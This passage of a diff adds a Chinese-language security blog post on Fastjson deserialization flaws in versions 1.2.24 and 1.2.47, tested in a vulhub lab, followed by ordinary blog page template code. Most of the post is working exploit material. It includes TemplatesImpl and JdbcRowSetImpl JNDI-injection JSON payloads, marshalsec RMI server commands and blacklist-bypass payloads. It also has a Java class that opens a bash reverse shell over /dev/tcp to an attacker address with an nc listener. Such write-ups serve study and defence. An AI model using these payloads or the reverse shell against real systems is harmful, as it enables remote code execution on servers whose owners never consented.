&#123;&#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2) throws TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译Exploit.java</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Exploit.java</span><br></pre></td></tr></table></figure>
+
+<p>将编译后得到的Exploit.class进行base64编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 Exploit.class</span><br></pre></td></tr></table></figure>
+
+<p>得到的编码放入bytescode中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,</span><br><span class="line">    &quot;_bytecodes&quot;: [&quot;yv66vgAAADcAIwoACgATBwAUCAAVCAAWCAAXCg......EAAAACABI=&quot;],</span><br><span class="line">    &quot;_name&quot;: &quot;happ3n&quot;,</span><br><span class="line">    &quot;_tfactory&quot;: &#123;&#125;,</span><br><span class="line">    &quot;_outputProperties&quot;: &#123;&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用post方法传参，将Content-Type改为application&#x2F;json，链子存在，且可以利用</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260411201921-kbw8p9h.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>但vulhub中无法利用TemplatesImpl进行反序列化，被spring拦截了，强制按user类解析json</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260412174806-ppnt50c.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>若是public Object test(@RequestBody Object obj)就能解析</p>
+<p>‍</p>
+<h3 id="利用二：JNDI注入"><a href="#利用二：JNDI注入" class="headerlink" title="利用二：JNDI注入"></a>利用二：JNDI注入</h3><p>com.sun.rowset.JdbcRowSetImpl中有javax.naming.InitialContextlookup()，其中lookup参数可控导致JNDI注入，且参数从dataSource中获取，源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">private Connection connect() throws SQLException &#123;</span><br><span class="line">        if(this.conn != null) &#123;</span><br><span class="line">            return this.conn;</span><br><span class="line">        &#125; else if(this.getDataSourceName() != null) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                InitialContext var1 = new InitialContext();</span><br><span class="line">                DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());</span><br><span class="line">                return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;)?var2.getConnection(this.getUsername(), this.getPassword()):var2.getConnection();</span><br><span class="line">            &#125; catch (NamingException var3) &#123;</span><br><span class="line">                throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return this.getUrl() != null?DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()):null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以用rmi或ladp协议，利用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">    &quot;dataSourceName&quot;:&quot;rmi://ip:23457/test&quot;,</span><br><span class="line">    &quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>创建任意TestTouch.java类，用javac进行编译得到class编译文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TestTouch &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;touch&quot;, &quot;/tmp/success-test&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用python启动http服务，使得TestTouch文件可被访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 1122</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260414141629-cyfk6h6.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>创建rmi或ldap服务，使用工具：<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mbechler/marshalsec</span><br><span class="line">cd marshalsec-master</span><br><span class="line">apt-get install maven</span><br><span class="line">mvn clean package -DskipTests # 使用jdk8来构建这个项目（切换为java8：update-alternatives --config java）</span><br></pre></td></tr></table></figure>
+
+<p>创建rmi服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.x.x:1122/#TestTouch&quot; 1096</span><br></pre></td></tr></table></figure>
+
+<p>posst请求，且修改类型为application&#x2F;json，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">      &quot;dataSourceName&quot;:&quot;rmi://192.168.x.x:1096/TestTouch&quot;,</span><br><span class="line">      &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260414141329-rnqlun6.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>http服务也有回显，TestTouch类成功被访问</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260414141437-1gkre8u.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>rmi成功远程调用TestTouch类</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260414141540-vkt6v1b.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>进入docker容器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 容器ID /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>看见文件创建成功，成功利用</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260414143014-7ecg5mf.png" alt="image" data-caption="image" loading="lazy"></p>
+<h2 id="1-2-47"><a href="#1-2-47" class="headerlink" title="1.2.47"></a>1.2.47</h2><p>相比于之前的版本，在PraserConfig多了一个autoTypeSupport黑名单检查</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260417161908-b1cqby5.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>类中黑名单为denyHashCodes</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260417170332-a2tsr3e.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>黑名单用hash加密了</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260417170631-lkq4trh.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>hash值没法还原，只能比对，这些hash值对应一些如下，黑名单中函数均不可直接调用，进行绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JdbcRowSetImpl</span><br><span class="line">TemplatesImpl</span><br><span class="line">BadAttributeValueExpException</span><br><span class="line">InvokerTransformer</span><br></pre></td></tr></table></figure>
+
+<p>如果开启autoTypeSupport，先检验白名单，若在白名单中，直接加载类；不在白名单中检验黑名单，黑名单中则返回类不支持</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260420145606-ahzmq00.png" alt="image" data-caption="image" loading="lazy"></p>
+<h3 id="绕过一："><a href="#绕过一：" class="headerlink" title="绕过一："></a>绕过一：</h3><p>既不在黑名单里又不在白名单里，则进入下面的if中，调用getClassFromMapping获取类，还为空则去deserializers中获取，</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260420145624-xy3n3kn.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>到TypeUtils里找getClassFromMapping方法，发现调用了mappings方法的get</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260421125621-3vzqjg9.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>找mappings方法是一个新的ConcurrentHashMap哈希表，看看put方法是否有可控的</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260421132450-tb5ih2z.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>在loadClass中找到mapping的put方法，可以put类并且对类进行加载，若把恶意类存入其中就可跳过黑名单过滤，直接加载</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260421134437-0x204s0.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>MiscCodec的deserialze类调用了TypeUtils.loadClass类，若类是Class.class，将调用TypeUtils.loadClass来加载strVal</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260421140522-g6boljt.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>其中strVal直接调用了parser.parse反序列，不走checkAutoType，相当于直接将json的val值写入mapping，可绕过黑名单</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260421142700-ib1s7lq.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>反弹Explot.java：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class Explot&#123;</span><br><span class="line">    public Explot() throws Exception &#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.xxx.xxx/8888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = new BufferedReader(new InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        while((line = reader.readLine()) != null) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://attacker-ip:1096/Explot&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>python创建访问网页</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260421150944-bcs859j.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>建立rmi服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.x.x:1122/#Explot&quot; 1096</span><br></pre></td></tr></table></figure>
+
+<p>开启监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 8888</span><br></pre></td></tr></table></figure>
+
+<p>用bp抓包，post发送payload，Content-Type为application&#x2F;json</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260421160734-irf2vh5.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>rmi服务远程访问java类，并加载类</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260421161052-231yisj.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>页面访问成功，被远程访问</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260421161307-hnp4qgx.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>加载类成功，反弹成功</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260421161443-ah7makq.png" alt="image" data-caption="image" loading="lazy"></p>
+<h3 id="绕过二："><a href="#绕过二：" class="headerlink" title="绕过二："></a>绕过二：</h3><p>praserConfig中会直接调用TypeUtils.loadClass</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(autoTypesupport || expectClass != null = false) &#123;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>loadClass中，能以”L”开头以”;”结尾绕过黑名单，且可去掉这两字符加载类</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/itwillhappen/Pic/main/Pic/image-20260421164406-29ullmo.png" alt="image" data-caption="image" loading="lazy"></p>
+<p>payload1：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;    </span><br><span class="line">    &quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;, </span><br><span class="line">    &quot;dataSourceName&quot;:&quot;rmi://ip:1096/Explot&quot;, </span><br><span class="line">    &quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload2：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;:&quot;[[com.sun.rowset.JdbcRowSetImpl&quot;, </span><br><span class="line">    &quot;dataSourceName&quot;:&quot;rmi://ip:1096/Explot&quot;,</span><br><span class="line">    &quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/n4c1/p/18905106#fastjson-1225-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E5%AF%B9%E6%8A%97checkautotype%E7%9A%84%E5%BC%80%E5%A7%8B">https://www.cnblogs.com/n4c1/p/18905106#fastjson-1225-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E5%AF%B9%E6%8A%97checkautotype%E7%9A%84%E5%BC%80%E5%A7%8B</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/smileleooo/p/18133893#fastjson-1247">https://www.cnblogs.com/smileleooo/p/18133893#fastjson-1247</a></p>
+
+    
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>本文作者：</strong>Happ3n<br>
+        
+        <strong>本文链接：</strong><a href="https://itwillhappen.github.io/2025/09/25/java-%E5%AE%89%E5%85%A8-8-Fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="https:&#x2F;&#x2F;itwillhappen.github.io&#x2F;2025&#x2F;09&#x2F;25&#x2F;java-%E5%AE%89%E5%85%A8-8-Fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;itwillhappen.github.io&#x2F;2025&#x2F;09&#x2F;25&#x2F;java-%E5%AE%89%E5%85%A8-8-Fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E&#x2F;</a><br>
+
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1776763871695"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          <div class="valine"></div>
+<script src='https://lib.baomitu.com/valine/1.3.9/Valine.min.js'></script>
+<script>
+  new Valine({
+      el: '.valine',
+      appId: 'r5zxC0st0DDjPA9auXzMV7HY-gzGzoHsz',
+      appKey: '3bqCsovpyfTPHUzTHovd3V3V'
+  })
+</script>
+
+      </div>
+  
+</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
+        <div class="nexmoe-tool">
+
+            
+
+            
+            
+            <button class="mdui-fab catalog" style="overflow:unset;">
+                <i class="nexmoefont icon-i-catalog"></i>
+                <div class="nexmoe-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E5%AE%89%E5%85%A88-Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">java安全8-Fastjson反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-24"><span class="toc-number">1.1.</span> <span class="toc-text">1.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B8%80%EF%BC%9Atemplates%E5%8F%8D%E5%BA%8F%E5%88%97%E9%93%BE"><span class="toc-number">1.1.1.</span> <span class="toc-text">利用一：templates反序列链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%BA%8C%EF%BC%9AJNDI%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.2.</span> <span class="toc-text">利用二：JNDI注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-47"><span class="toc-number">1.2.</span> <span class="toc-text">1.2.47</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E4%B8%80%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">绕过一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E4%BA%8C%EF%BC%9A"><span class="toc-number">1.2.2.</span> <span class="toc-text">绕过二：</span></a></li></ol></li></ol></li></ol>
+                </div>
+            </button>
+            
+
+            
+
+            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+        </div>
+    </div>
+</div></div><div id="nexmoe-pendant"><div class="nexmoe-drawer  nexmoe-pd" id="drawer" style="overflow-x: auto;overflow-y: auto;">
+
+     
+        
+
+        <div class="nexmoe-pd-item">
+    <div class="clock">
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="memory"></div>
+        <div class="needle" id="hours"></div>
+        <div class="needle" id="minutes"></div>
+        <div class="needle" id="seconds"></div>
+        <div class="clock_logo">
+
+        </div>
+
+    </div>
+</div>
+<script>
+    // ----- Variable declaration
+
+    var data = {
+        dt: new Date(),
+        hours: {
+            el: document.querySelector('#hours'),
+            val: 0
+        },
+
+        minutes: {
+            el: document.querySelector('#minutes'),
+            val: 0
+        },
+
+        seconds: {
+            el: document.querySelector('#seconds'),
+            val: 0
+        },
+
+        renderTime: 1000
+    };
+
+
+    // ----- Clock rendering logic
+
+    updateTime = () => {
+        let hour = data.dt.getHours();
+        let minute = data.dt.getMinutes();
+        let second = data.dt.getSeconds();
+
+        data.hours.el.classList.add('moving');
+        data.minutes.el.classList.add('moving');
+        data.seconds.el.classList.add('moving');
+
+        data.hours.val = hour == 0 && data.hours.val == 59 * 6 * 5 ? 360 : hour * 6 * 5;
+        data.minutes.val = minute == 0 && data.minutes.val == 59 * 6 ? 360 : minute * 6;
+        data.seconds.val = second == 0 && data.seconds.val == 59 * 6 ? 360 : second * 6;
+
+        data.hours.el.style.transform = `translate(-50%, -75%) rotate(${data.hours.val}deg)`;
+        data.minutes.el.style.transform = `translate(-50%, -75%) rotate(${data.minutes.val}deg)`;
+        data.seconds.el.style.transform = `translate(-50%, -75%) rotate(${data.seconds.val}deg)`;
+
+        data.dt.setSeconds(second + 1);
+    };
+
+    // ----- Clock execution
+
+    setInterval(() => {
+        updateTime();
+    }, data.renderTime);
+
+    updateTime();
+
+    // ----- Events area
+
+    data.seconds.el.addEventListener('transitionend', () => {
+        data.hours.el.classList.remove('moving');
+        data.minutes.el.classList.remove('moving');
+        data.seconds.el.classList.remove('moving');
+
+        // if (data.hours.val == 360) {
+        //   data.hours.el.style.transform = 'translate(-50%, -75%) rotate(0deg)';
+        // }
+
+        if (data.minutes.val == 360) {
+            data.minutes.el.style.transform = 'translate(-50%, -75%) rotate(0deg)';
+        }
+
+        if (data.seconds.val == 360) {
+            data.seconds.el.style.transform = 'translate(-50%, -75%) rotate(0deg)';
+        }
+    });
+
+</script>
+<style>
+    .clock {
+        background-color: #ffffff;
+        width: 70vw;
+        height: 70vw;
+        max-width: 70vh;
+        max-height: 70vh;
+        border: solid 2.8vw var(--color-primary);
+        position: relative;
+        overflow: hidden;
+        border-radius: 50%;
+        box-sizing: border-box;
+        box-shadow: 0 1.4vw 2.8vw var(--color2);
+        zoom: 0.2
+    }
+
+    .memory {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform-origin: center;
+    }
+
+    .memory:nth-child(1) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(0deg) translateY(-520%);
+    }
+
+    .memory:nth-child(2) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(6deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(3) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(12deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(4) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(18deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(5) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(24deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(6) {
+        background-color: var(--color-primary);
+        width: 2%;
+        height: 8%;
+        transform: translate(-50%, -50%) rotate(30deg) translateY(-520%);
+    }
+
+    .memory:nth-child(7) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(36deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(8) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(42deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(9) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
+        transform: translate(-50%, -50%) rotate(48deg) translateY(-1461%);
+    }
+
+    .memory:nth-child(10) {
+        background-color: #949494;
+        width: 1%;
+        height: 3%;
